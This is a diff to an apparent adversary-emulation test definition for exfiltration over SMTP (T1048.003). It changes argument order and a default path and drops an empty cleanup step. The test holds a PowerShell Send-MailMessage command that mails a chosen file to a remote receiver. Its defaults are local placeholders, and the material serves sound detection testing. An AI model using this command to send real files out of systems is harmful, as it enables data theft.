@@ -4,16 +4,16 @@ description: |
     Exfiltration of specified file over SMTP.
     Upon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.
 args:
+    - name: receiver
+      type: string
+      default: test@corp.com
     - name: smtp_server
       type: string
       default: 127.0.0.1
     - name: input_file
       type: path
-      default: C:\Windows\System32\notepad.exe
+      default: C:\\Windows\\System32\\notepad.exe
     - name: sender
-      type: string
-      default: test@corp.com
-    - name: receiver
       type: string
       default: test@corp.com
 uuid: ec3a835e-adca-4c7c-88d2-853b69c11bb9
@@ -32,6 +32,3 @@ steps:
       inline: |
         Send-MailMessage -From {{.Args.sender}} -To {{.Args.receiver}} -Subject "T1048.003 Atomic Test" -Attachments {{.Args.input_file}} -SmtpServer {{.Args.smtp_server}}
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
